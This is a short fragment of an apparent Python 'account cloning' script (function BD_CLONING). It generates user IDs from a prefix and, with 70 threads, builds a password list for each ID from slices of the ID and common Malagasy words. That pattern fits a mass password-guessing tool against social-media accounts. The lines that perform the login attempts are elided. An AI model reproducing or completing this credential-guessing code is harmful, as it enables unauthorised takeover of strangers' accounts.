...
def BD_CLONING():
    ...
    with tred(max_workers=70) as Dipto:
        ...
        for psx in user:
            ids=code+psx
            passlist=[psx,ids,ids[:6],ids[:6],ids[5:],'anjara','finoana','mamako','felana','mahefa','safidy','mahery','papako','vadiko','tanjona','fitiavako','nirina','fitiavana','amboara','valisoa','nomena','sitraka','santatra','herizo','lahatra','lafatra','faniry','hasina','nilaina','nomena','malala','harena','finoana','diamondra','fanomezana','fitiavana','fanantenana','nirina','faneva','hasina','fitahina','malala','mendrika','mandresy','fifalina','fitiavako','Mahefa','harena','fitahina','fahendrena','sarobidy','valisoa','miangaly','miangola','Valisoa','finoana','Finoana','namako','hasina','Hasina','malala','Malala','faniry','Faniry','fanantenana','Fanantenana','nekena','Nekena','fifalina','Fifalina','fitahina','Fitahina','faniry','Faniry','mandresy','Mandresy','fiderana','Fiderana','fandresena']
